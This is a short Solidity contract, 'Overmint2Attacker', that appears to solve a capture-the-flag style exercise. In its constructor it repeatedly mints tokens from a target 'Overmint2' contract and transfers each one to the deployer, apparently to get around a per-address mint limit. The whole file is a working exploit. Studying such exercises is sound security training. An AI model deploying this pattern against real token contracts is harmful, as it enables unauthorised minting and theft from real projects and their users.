// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {Overmint2} from "../Overmint2.sol";

contract Overmint2Attacker {
    Overmint2 victimContract;

    constructor(address _victimContract) {
        victimContract = Overmint2(_victimContract);
        for (uint256 i = 1; i < 6; ++i) {
            victimContract.mint();
            victimContract.transferFrom(address(this), msg.sender, i);
        }
    }
}
